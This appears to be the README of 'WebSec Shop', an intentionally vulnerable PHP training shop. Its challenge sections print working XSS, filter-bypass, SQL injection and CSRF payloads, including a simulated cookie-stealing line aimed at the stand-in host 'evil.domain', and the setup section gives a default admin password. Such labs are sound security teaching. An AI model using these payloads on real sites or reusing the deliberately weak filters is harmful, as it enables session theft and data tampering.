# WebSec Shop
---

This is a short summary of the most important points of the documentation for the WebSec Shop. The Docker environment and the test environment (Vagrant) are described in separat README files. 

## Installation and Setup

1. Setup the Docker environment with the ```setup_docker.sh``` script or follow the steps described in the Docker README manually.

2. Login with the default admin user:
- **user** ```administrator```
- **password** ```dpbCpfcAqVHY3gYf```

3. Change the default password after your first login!

4. Choose your settings either in the admin area of the WebSec shop or edit them directly in the ```config/settings.json``` file. *(The difficulty of the challenges must be set **before** the first student logs in. Otherwise, every student has to reset their challenges in the menu manually in order to load the new challenge settings.)*

5. **Optional**: You can also create a user of your choice and later set the admin status via phpMyAdmin or the MySQL command line client:

- Connect to the MySQL database

```shell
$ docker exec -it <db_container_name> /bin/bash

$ mysql -u <dbUser> -p login
```

- The SQL query could look something like this:

```sql
UPDATE users SET is_admin = 1 WHERE user_name = <shopUser>;
``` 

## Project Structure
This is an overview over the files and directories directly related to the WebSec Shop. The structure is based on the [Standard PHP Package Skeleton](https://github.com/php-pds/skeleton).

The figure below shows the structure of the main directory **www/** and the purpose and contents of each subdirectory.
```
www/
├── bin/
│   └── command line tools
│
├── config/
│   └── php configuration files
│   └── shop settings file
│
├── data/
│   └── sqlite databases
│   └── user input files
│
├── docs/
│   └── short documentation
│
├── public/
│   └── admin/
│   │   └── pages for the admin area and global settings
│   │
│   └── assets/
│   │   └── CSS, JavaScript and images
│   │
│   └── pma/
│   │   └── access to phpMyAdmin (optional)
│   │
│   └── shop/
│   │   └── pages for the challenges
│   │
│   └── user/
│       └── pages for user settings
│
├── src/
│   └── includes/
│   │   └── include files
│   └── php functions
│
├── tests/
│   └── php unit tests (PHPUnit)
│
└── vendor
    └── dependencies (for PHPUnit)
```

### bin/

Contains the command line tools for this project.
- **```convert_md_to_html.sh```** Converts markdown files (like this one) to valid HTML for the **docs/** folder.
- **```get_docker_logs.sh```** Copies log files from the separat Docker containers into the **bin/** folder.


### config/

Contains the configurations and settings for the shop.
- **```config.php```** Stores important constants for the project (server name, paths etc.). Is effected by the ```setup_docker.sh``` script.

- **```db_login.php```** Contains the login credentials for the login database. Is also setup by the ```setup_docker.sh``` script.

- **```db_shop.php```** Contains the login credentials for the shop database. Is also setup by the ```setup_docker.sh``` script.

- **```settings.json```** Stores all settings for the shop. For a more detailed description see the paragraph **Settings**.


### data/

Contains all user SQLite databases for the SQLi challenge and the user input JSON files.

On **normal** difficulty the databases are initialized with one table (users) that stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding student. The password that is displayed for the student is a random string.

On **hard** difficulty the databases are extended by a second table (premium_users) in which the premium user status is stored for every fake user and the student.

The databases are created during the registration process with the ```create_sqli_db``` function in **src/websec_functions.php**.

All user input related to the hacking challenges is stored in user specific JSON files, which are created when the user attempts a challenge for the first time. The user input in the JSON files is grouped by challenges.

### docs/

Contains the README files for all project components as HTML documents. The HTML files can be generated automatically with the ```convert_md_to_html.sh``` script in **bin/** from the original markdown files. 

### public/

This is the root directory for the apache web server. All files within this directory are accessible from the outside. The remaining files in **www/** must be explicitly loaded by a php file to be visible to the user.


The files for the registration and login system of the shop are directly located in the root directory.

The ```.htaccess``` file redirects the most common HTTP errors (400, 401, 402, 403, 404, 500) to custom error pages.

The **admin/** directory contains the restricted admin area. Here you can see and download the student results for the challenges, change global shop settings and access the phpMyAdmin site for the MySQL databases *(if enabled in the ```docker-compose.yml```)*.

The index file in the **pma/** directory checks if a user is either an admin user or has a valid token in order to redirect only authorized requests to the *"hidden"* phpMyAdmin directory. (*hidden* means in this context a random string as name for the phpMyAdmin directory).
This option is only relevant if phpMyAdmin and apache are installed in the same Docker container. Otherwise, phpMyAdmin can be accessed via an open port. For more information on this, see the Docker README.

All pages related to the shop system and the hacking challenges are located in the **shop/** directory.

The pages for the user settings and the local challenge settings are in the **user/** directory.

All assets files like JavaScript, CSS or images are stored in the **assets/** directory. Third party JavaScript or CSS files are stored separately in directories named 'vendor'.

### src/

The **src/** directory contains all php functions relevant to the shop and the challenges. Depending on their domain, the functions are stored in different files each denoted with an appropriate prefix (```*_functions.php```).

The **includes/** directory includes various files; mainly repetitive content that is later loaded in by other php scripts. The files are separated in different groups by their prefixes.

### tests/

Contains the [PHPUnit](https://phpunit.de/) tests. This directory can be omitted in production.


### vendor/

All dependencies for the project are stored in this directory. Currently, only the PHPUnit module has any dependencies. Hence, this directory can also be omitted in production.

## Challenges

This is a short summary of the hacking challenges in the WebSec Shop and their solutions.

### Cross Site Scripting (Reflective)

The reflective XSS challenge is located in the ```overview.php``` file.

**Challenge**: The challenge is to abuse the product search field to read out the users own session ID that is stored in a cookie (XSS_YOUR_SESSION). The challenge is completed, if the user enters the cookie in the corresponding popup field.

The cookie is automatically generated during the user registration process and later set after the user logs in. The cookie is destroyed after the session ends and the user logs out.
The popup containing the field to enter the solution is automatically shown to the user after a JavaScript dialog (`alert()`, `confirm()` or `prompt()`) has been used on the product search page. To achieve this, a script overrides every dialog with a custom function. The custom function displays the original dialog (the users XSS attack) followed by the popup to enter the cookie.

```js
// temporarily override alert()
// there are also variants for confirm() and prompt()
(function () {

    var _alertXSS = window.alert;

    window.alert = function () {

        // show the original alert content
        _alertXSS.apply(window, arguments);

        // show the popup to enter the solution
        $('#xss-solution').modal('show');
    };
})();
```

**Solution**: Since the search term is printed out to the page, a solution would be to use a JavaScript dialog to output the cookie property of the document. JavaScript code can be executed by adding `<script>` tags to the search term. A working example would look like this:

```html
<!-- could also be confirm(document.cookie) or prompt(document.cookie) -->
<script>alert(document.cookie);</script>
```

Another approach would be to write the cookie directly to the page.

```html
<script>document.write(document.cookie)</script>
```

*If the attack is not performed via a JavaScript dialog function, the user has the option to trigger the popup mentioned above manually. A button and a short self-explanatory text is shown, when the search field is used and the search term contains `document.cookie`.*

**Difficulty**: On hard difficulty the search term is filtered for `<script>` tags: 

```php
if ($difficulty == "hard") {
    // filter all '<script>' tags (case insensitive)
    $rawSearchTerm = str_ireplace("<script>", "", $rawSearchTerm);

    /*
    * Alternative: filter only '<script>' and '<SCRIPT>' tags
    * str_replace("<script>","", $rawSearchTerm)
    * str_replace("<SCRIPT>","", $rawSearchTerm)
    * Solution for all browsers: <ScRiPt>alert(document.cookie)</ScRiPt>
    */
}
```

The user has to circumvent this measure by using a different HTML tag that allows the execution of JavaScript. An example that works with all modern browsers would be the `<img>` tag:

```html
<img src="" onerror=javascript:alert(document.cookie)>
```

### Cross Site Scripting (Stored)

The stored XSS challenge is located in the ```product.php``` file.

**Challenge**: In this challenge the user has to exploit a comment field on the product page. *(The product page and the comment section are identical for all products. Only the product information changes based on the `GET` variable in the URL.)* The comments are stored in a MySQL database. The task is to simulate a cookie stealing attack by showing a JavaScript dialog with the content ```'evil.domain/cookie.php?c=' + document.cookie```. The challenge is completed, when the user *steals* a session of a fake user and adds a specific product to the shopping cart.

If the user enters the payload, the JavaScript dialog functions are overwritten and the content is send via AJAX Request to the file `post_handler.php`.

```js
// override alert()
// there are also variants for confirm() and prompt()
window.alert = function (message) {

    var request;

    request = $.post("post_handler.php", {
        storedXSSMessage: message
    });
    request.done(function (response) {
        showSuccess(message, response);
    });
    request.fail(function (response) {
        showError(message, response);
    });
};
```

The message is validated by checking if it contains at least the elements 'evil', 'domain', 'cookie' and 'document.cookie' in any given order. After that, the user is shown a success or error message.

The success message is a JavaScript `confirm()` dialog that gives the user the option to *steal* the session of a fake user. In order to simulate this, a second cookie is set that triggers a 'Welcome Back, *fake user*' popup and a function call to fill the shopping cart with a variety of products.
The `check_stored_xss_challenge()` function is always called when the shop header is loaded on a page and checks if a certain product is added to the cart in order to successfully complete this challenge.

**Solution**: To solve this challenge, the user has to display the payload on the product page. This could be done like this:

```html
<script>alert('evil.domain/cookie.php?c=' + document.cookie);</script>
```

**Difficulty**: On hard difficulty the `<script>` tags and the `alert()` function are filtered before a user comment is stored to the database. 

```php
if ($difficulty == "hard") {

    // filter all '<script>' tags (case insensitive)
    $filteredComment = str_ireplace("<script>", "", $_POST['userComment']);

    /*
    * Alternative: filter only '<script>' and '<SCRIPT>' tags
    * str_replace("<script>","", $rawSearchTerm)
    * str_replace("<SCRIPT>","", $rawSearchTerm)
    * Solution for all browsers: <ScRiPt>alert(document.cookie<ScRiPt>
    */

    // additionally filter 'alert' command
    $filteredComment = str_replace("alert", "", $filteredComment);

    // add filtered comment to database
    add_comment_to_db($filteredComment, $_SESSION['userName']);
}
```

To circumvent this restrictions, the user can rely an a different HTML tag like `<img>` and use another JavaScript dialog function like `confirm()`.

```html
<img src="" onerror=javascript:confirm('evil.domain/cookie.php?c=' + document)>
```

The user could also use the `document.write` function.

### SQL Injection

The SQLi challenge is located in the `friends.php` file.

**Challenge**: In this challenge the user should exploit a search field and a SQLite database. The task is to upgrade the user account to a premium membership.

The search field queries the 'users' table of the SQLite database which stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding user.

```sql
SELECT username, email, wishlist FROM users WHERE username = '<search>';
```

**Solution**: To solve this challenge the user needs to inject a SQL query that updates the users premium status in the database. An example could look like this:

```sql
'; UPDATE users SET user_status = 'premium' WHERE username = '<user>';--
```

The `';` closes off the original SELECT query. The `--` at the end comments out all remaining parts of the initial query.

**Difficulty**: On hard difficulty the premium status is no longer stored directly in the users table but in a separat table. To find this table, the user needs to query the sqlite_master table.

```sql
'; SELECT * FROM sqlite_master;--
```

Furthermore, the input length for the search field is limited by the HTML attribute `maxlength`. The user has to manually increase this limit to enter SQL statements longer than 10 characters.

```html
<input maxlength="10">
```

### Cross Site Request Forgery

The CSRF challenge is located in the `contact.php` file.

**Challenge**: In this challenge the user should send a support request to the closed contact form. In addition, the request should look like it was send by the fake user 'Elliot'.

**Solution**: This challenge can be solved in three different ways. The easiest option is to manipulate the product comment form on ```product.php``` with the browser inspector to include the same input names as the closed contact form.

The product comment field could also be manipulated with JavaScript:

```html
<script>
var frm = document.getElementById('CSRForm');
frm.action = "contact.php";
document.getElementById('challengeUsername').value="elliot";
document.getElementById('challengePost').name="userPost";
</script>
```

Another way to solve this challenge would be to send an AJAX request via one of the fields that are vulnerable to XSS attacks:

```html
<script>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned");
</script>
```

**Difficulty**: On hard difficulty the user needs to send a user specific token with the support request. This token can be obtained for the user Elliot from the SQLite database during the SQLi challenge.

```html
<ScRiPt>
const xhr = new XMLHttpRequest();
xhr.open("POST", "contact.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("uname=elliot&userPost=pwned&utoken=<token>");
</ScRiPt>
```

## Adding New Challenges

If you add new challenges to the shop, please consider the following points in order to keep the project consistent:

- New challenges should be added on separat pages
- A challenge page should be stored in **public/shop/**
- All challenge related functions should be stored in `websec_functions.php`
- Increase the number of challenges in `config.php`
- A reset functionality for the new challenge must also be added.

## Naming Conventions

The following naming conventions should be used throughout the project.

**Variables**: ```variableName```

**Constants**: ```CONSTANT_NAME```

**Methods / Functions**: ```method_name```

**CSS Classes**: ```class-name```

**CSS IDs**: ```idName```

**HTML Fields etc.**: ```field-name```

**DB Fields**: ```[table]_field_name```

**PHP Files**: ```file_name.php```

**Other (Asset) Files**: ```file_name.ending```
